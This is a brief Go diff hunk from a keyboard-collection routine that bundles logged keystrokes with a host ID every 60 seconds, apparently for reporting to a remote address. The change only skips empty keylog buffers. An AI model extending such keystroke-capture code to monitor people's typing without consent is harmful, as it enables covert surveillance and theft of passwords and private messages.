@@ -40,6 +40,10 @@ func KeyBoardCollection(addr string) {
 		keyboardStatusResponse := KeyboardStatusResponse{}
 		var versionDetail = machineinfo.GetSystemVersion()
 		if elapsedsec == 60 {
+			// remove null
+			if len(tmpKeylog) == 0 {
+				continue
+			}
 			msgstb := msg{
 				Record: tmpKeylog,
 				Hostid: versionDetail.Hostid,
